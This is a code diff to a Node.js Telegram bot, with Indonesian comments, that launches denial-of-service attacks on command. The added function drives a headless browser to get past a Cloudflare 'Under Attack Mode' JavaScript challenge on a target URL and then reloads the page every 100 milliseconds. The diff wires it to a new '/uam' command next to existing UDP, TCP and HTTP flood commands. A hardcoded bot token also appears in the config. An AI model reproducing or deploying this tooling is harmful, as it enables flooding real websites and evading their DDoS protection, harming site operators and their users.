@@ -6,6 +6,7 @@ const dgram = require('dgram');
 const net = require('net');
 const http = require('http');
 const crypto = require('crypto');
+const puppeteer = require('puppeteer');
 
 // --- KONFIGURASI ---
 const BOT_TOKEN = "8522639108:AAGFgk9CHoKX9Owgu1sj1o9PAYZOZdDEnUI"; // Ganti dengan token bot Anda
@@ -18,7 +19,59 @@ const userAgents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
 ];
+async function uamBypass(url, duration, msg) {
+    const chatId = msg.chat.id;
+    let browser;
+    try {
+        bot.sendMessage(chatId, `[UAM_BYPASS] Meluncurkan instance browser... Ini mungkin memakan waktu.`);
+        browser = await puppeteer.launch({
+            headless: true,
+            args: [
+                '--no-sandbox',
+                '--disable-setuid-sandbox',
+                '--disable-dev-shm-usage',
+                '--disable-accelerated-2d-canvas',
+                '--no-first-run',
+                '--no-zygote',
+                 '--single-process', // Opsional, bisa membantu di lingkungan terbatas
+                '--disable-gpu'
+            ]
+        });
+        const page = await browser.newPage();
+        
+        bot.sendMessage(chatId, `[UAM_BYPASS] Menavigasi ke ${url} dan mencoba melewati tantangan JS...`);
+        
+        // Navigasi ke URL, Puppeteer akan menunggu hingga halaman dimuat (termasuk tantangan JS)
+        await page.goto(url, { waitUntil: 'networkidle2', timeout: 60000 });
+        
+        // Cek judul halaman setelah navigasi untuk konfirmasi
+        const pageTitle = await page.title();
+        bot.sendMessage(chatId, `[UAM_BYPASS] Tantangan terlewati. Judul halaman target: "${pageTitle}". Memulai flood...`);
+        
+        const endTime = Date.now() + duration * 1000;
+        
+        const attackInterval = setInterval(async () => {
+            if (Date.now() > endTime) {
+                clearInterval(attackInterval);
+                await browser.close();
+                bot.sendMessage(chatId, `[UAM_BYPASS] Serangan terhadap ${url} telah selesai.`);
+                return;
+            }
+            // Reload halaman secara terus menerus setelah tantangan dilewati
+            try {
+                await page.reload({ waitUntil: 'domcontentloaded' });
+            } catch (reloadError) {
+                // Abaikan error jika halaman gagal reload, teruskan serangan
+            }
+        }, 100); // Interval reload cepat
 
+    } catch (error) {
+        bot.sendMessage(chatId, `[UAM_BYPASS] Gagal: ${error.message}. Pastikan URL valid dan server dapat diakses. Mungkin perlu waktu timeout lebih lama.`);
+        if (browser) {
+            await browser.close();
+        }
+    }
+}
 // -- Layer 7 --
 function bypass(target, port, duration) {
     const attackInterval = setInterval(() => {
@@ -146,6 +199,11 @@ bot.onText(/\/stress (\S+) (\d+) (\d+)/, (msg, match) => handleAttackCommand(msg
 bot.onText(/\/udp (\S+) (\d+) (\d+)/, (msg, match) => handleAttackCommand(msg, match, udp));
 bot.onText(/\/tcpconn (\S+) (\d+) (\d+)/, (msg, match) => handleAttackCommand(msg, match, tcpconn));
 bot.onText(/\/tcpdata (\S+) (\d+) (\d+)/, (msg, match) => handleAttackCommand(msg, match, tcpdata));
+bot.onText(/\/uam (\S+) (\d+)/, (msg, match) => {
+    const url = match[1];
+    const duration = parseInt(match[2]);
+    uamBypass(url, duration, msg);
+});
 
 
 // --- Mulai Bot ---
